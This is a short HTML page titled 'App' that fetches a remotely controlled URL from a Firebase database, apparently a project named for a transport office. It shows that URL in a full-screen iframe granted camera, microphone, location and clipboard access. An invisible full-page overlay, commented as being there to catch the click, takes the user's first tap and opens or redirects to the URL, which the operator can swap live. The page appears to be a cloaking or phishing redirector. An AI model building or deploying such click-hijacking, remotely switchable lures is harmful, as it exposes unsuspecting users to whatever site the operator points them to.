<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>App</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #0f0f13;
            overscroll-behavior: none;
        }

        iframe {
            position: fixed;
            inset: 0;
            width: 100%;
            height: 100%;
            border: none;
            display: block;
            background: #fff;
        }

        /* Invisible overlay — click pakadne ke liye */
        #clickOverlay {
            position: fixed;
            inset: 0;
            z-index: 9999;
            cursor: pointer;
            background: transparent;
            display: none;
        }

        #clickOverlay.show { display: block; }

        /* Small hint */
        #hint {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.85);
            color: #fff;
            padding: 10px 18px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            z-index: 10000;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: none;
            animation: pulseHint 2s infinite;
        }

        #hint.show { display: block; }

        @keyframes pulseHint {
            0%, 100% { opacity: 0.9; transform: translateX(-50%) scale(1); }
            50% { opacity: 1; transform: translateX(-50%) scale(1.05); }
        }
    </style>
</head>
<body>

    <iframe
        id="appFrame"
        allow="camera; microphone; fullscreen; clipboard-read; clipboard-write; geolocation; autoplay"
        allowfullscreen
        referrerpolicy="no-referrer-when-downgrade"
    ></iframe>

    <!-- Click overlay -->
    <div id="clickOverlay"></div>

    <!-- Hint -->
    <div id="hint">👆 Tap anywhere to open in fullscreen</div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, get, onValue }
            from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
            authDomain: "my-rto-b2531.firebaseapp.com",
            databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
            projectId: "my-rto-b2531",
            storageBucket: "my-rto-b2531.appspot.com",
            messagingSenderId: "465334829178",
            appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
        };

        const RTDB_PATH = 'config';

        const appFrame = document.getElementById('appFrame');
        const clickOverlay = document.getElementById('clickOverlay');
        const hint = document.getElementById('hint');

        let app, db;
        let currentUrl = null;
        let hasRedirected = false;

        try {
            app = initializeApp(firebaseConfig);
            db = getDatabase(app);
        } catch (e) {
            console.error('Firebase init error:', e);
        }

        /* ============================================================
           EXTRACT URL
           ============================================================ */
        function extractUrl(data) {
            if (!data) return null;
            if (typeof data === 'string') return data;
            if (data.activeUrl) return data.activeUrl;
            if (data.active === 1 && data.url1) return data.url1;
            if (data.active === 2 && data.url2) return data.url2;
            if (data.url1) return data.url1;
            if (data.url2) return data.url2;
            if (data.url) return data.url;
            if (data.link) return data.link;
            return null;
        }

        function normalizeUrl(url) {
            if (!url) return null;
            url = url.trim();
            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                url = 'https://' + url;
            }
            return url;
        }

        /* ============================================================
           LOAD URL IN IFRAME
           ============================================================ */
        async function loadApp() {
            try {
                const snapshot = await get(ref(db, RTDB_PATH));
                if (!snapshot.exists()) return;

                const url = normalizeUrl(extractUrl(snapshot.val()));
                if (!url) return;

                currentUrl = url;
                appFrame.src = url;

                // Show overlay + hint after iframe loads
                appFrame.onload = () => {
                    console.log('✅ Iframe loaded:', url);
                    setTimeout(() => {
                        clickOverlay.classList.add('show');
                        hint.classList.add('show');
                    }, 500);
                };

            } catch (err) {
                console.error('Load error:', err);
            }
        }

        /* ============================================================
           CLICK OVERLAY — NEW TAB FULLSCREEN
           ============================================================ */
        clickOverlay.addEventListener('click', async () => {
            if (hasRedirected || !currentUrl) return;
            hasRedirected = true;

            console.log('🖱️ Overlay clicked — opening fullscreen');

            // Hide overlay + hint
            clickOverlay.classList.remove('show');
            hint.classList.remove('show');

            // Try fullscreen on current page first
            try {
                if (document.documentElement.requestFullscreen) {
                    await document.documentElement.requestFullscreen();
                }
            } catch (e) {
                console.log('Fullscreen not available:', e);
            }

            // Open new tab with URL
            const newTab = window.open(currentUrl, '_blank');

            if (newTab) {
                console.log('✅ New tab opened');

                // Try to fullscreen the new tab
                try {
                    newTab.focus();
                } catch (e) {}

                // Close current tab after 1 sec (optional)
                setTimeout(() => {
                    // window.close(); // uncomment if you want to close current tab
                }, 1000);
            } else {
                // Popup blocked — fallback to direct redirect
                console.warn('⚠️ Popup blocked — redirecting directly');
                window.location.href = currentUrl;
            }
        });

        /* ============================================================
           LIVE SYNC
           ============================================================ */
        function watchConfig() {
            onValue(ref(db, RTDB_PATH), (snapshot) => {
                if (!snapshot.exists()) return;
                const url = normalizeUrl(extractUrl(snapshot.val()));
                if (url && url !== currentUrl) {
                    currentUrl = url;
                    appFrame.src = url;
                    hasRedirected = false;
                    clickOverlay.classList.add('show');
                    hint.classList.add('show');
                }
            });
        }

        /* ============================================================
           START
           ============================================================ */
        loadApp();
        watchConfig();
    </script>
</body>
</html>
